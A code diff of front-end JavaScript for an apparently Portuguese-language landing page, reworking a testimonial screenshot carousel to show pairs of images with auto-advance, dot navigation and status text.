+const renderWa=(item,i)=>`<div class="wa-slide" role="group" aria-label="Imagem ${i+1} de ${WA_IMAGES.length}"><div class="wa-image-frame"><img class="wa-print" src="${item.src}" alt="${item.alt}" width="${item.width}" height="${item.height}" loading="${i===0?'eager':'lazy'}" decoding="async"><span class="wa-profile-photo" style="left:${item.avatarX}%;top:${item.avatarY}%;width:${item.avatarWidth}%"><img class="${item.name === 'Carla Mendes' ? 'wa-carla-photo' : ''}" src="${item.profile}" alt="Foto de perfil fornecida para ${item.name}" loading="lazy" style="width:${item.zoom*100}%;height:${item.zoom*100}%;left:${item.profileLeft}%;top:${item.profileTop}%"></span></div></div>`;
+const waPages=Math.ceil(WA_IMAGES.length/2);
+waTrack.innerHTML=Array.from({length:waPages},(_,page)=>`<div class="sl wa-pair">${WA_IMAGES.slice(page*2,page*2+2).map((item,j)=>renderWa(item,page*2+j)).join('')}</div>`).join('');
+waDots.innerHTML=Array.from({length:waPages},(_,i)=>`<button type="button" aria-label="Ver depoimentos ${i*2+1} e ${Math.min(i*2+2,WA_IMAGES.length)}" aria-current="${i===0}"></button>`).join('');
 let waIndex=0;
-function waUpdate(){waIndex=Math.max(0,Math.min(WA_IMAGES.length-1,Math.round(waTrack.scrollLeft/waTrack.clientWidth)));[...waDots.children].forEach((b,i)=>b.setAttribute('aria-current',String(i===waIndex)));$('#wa-status').textContent='Depoimento '+(waIndex+1)+' de '+WA_IMAGES.length;$('#wa-prev').disabled=waIndex===0;$('#wa-next').disabled=waIndex===WA_IMAGES.length-1;}
-function waGo(i){const target=Math.max(0,Math.min(WA_IMAGES.length-1,i));waTrack.scrollTo({left:target*waTrack.clientWidth,behavior:window.matchMedia('(prefers-reduced-motion: reduce)').matches?'auto':'smooth'});}
+function waUpdate(){waIndex=Math.max(0,Math.min(waPages-1,Math.round(waTrack.scrollLeft/waTrack.clientWidth)));[...waDots.children].forEach((b,i)=>b.setAttribute('aria-current',String(i===waIndex)));$('#wa-status').textContent='Depoimentos '+(waIndex*2+1)+' e '+Math.min(waIndex*2+2,WA_IMAGES.length)+' de '+WA_IMAGES.length;$('#wa-prev').disabled=waIndex===0;$('#wa-next').disabled=waIndex===waPages-1;}
+function waGo(i){const target=Math.max(0,Math.min(waPages-1,i));waTrack.scrollTo({left:target*waTrack.clientWidth,behavior:window.matchMedia('(prefers-reduced-motion: reduce)').matches?'auto':'smooth'});}
 [...waDots.children].forEach((b,i)=>b.addEventListener('click',()=>waGo(i)));
 $('#wa-prev').addEventListener('click',()=>waGo(waIndex-1));$('#wa-next').addEventListener('click',()=>waGo(waIndex+1));
 waTrack.addEventListener('scroll',waUpdate,{passive:true});waTrack.addEventListener('keydown',e=>{if(e.key==='ArrowRight'){e.preventDefault();waGo(waIndex+1);}if(e.key==='ArrowLeft'){e.preventDefault();waGo(waIndex-1);}});
 window.addEventListener('resize',()=>{waTrack.scrollTo({left:waIndex*waTrack.clientWidth,behavior:'instant'});});waUpdate();
+/* Passagem automática dos pares, mesmo com o cursor sobre o carrossel. */
+let waAutoTimer=null,waTouching=false;
+function stopWaAuto(){clearInterval(waAutoTimer);waAutoTimer=null;}
+function startWaAuto(){stopWaAuto();if(document.hidden||waTouching||waPages<2)return;waAutoTimer=setInterval(()=>waGo((waIndex+1)%waPages),6000);}
+waTrack.addEventListener('touchstart',()=>{waTouching=true;stopWaAuto();},{passive:true});
+waTrack.addEventListener('touchend',()=>{waTouching=false;startWaAuto();},{passive:true});
+waTrack.addEventListener('touchcancel',()=>{waTouching=false;startWaAuto();},{passive:true});
+document.addEventListener('visibilitychange',startWaAuto);
+startWaAuto();
+
 /* receitas */
 $('#gr').innerHTML=CFG.recipes.map(([k,t,d])=>`<article class="cd"><img src="${IMG[k]}" alt="${t}" loading="lazy"><div><h3>${t}</h3><p>${d}</p></div></article>`).join('');
 /* avaliações */
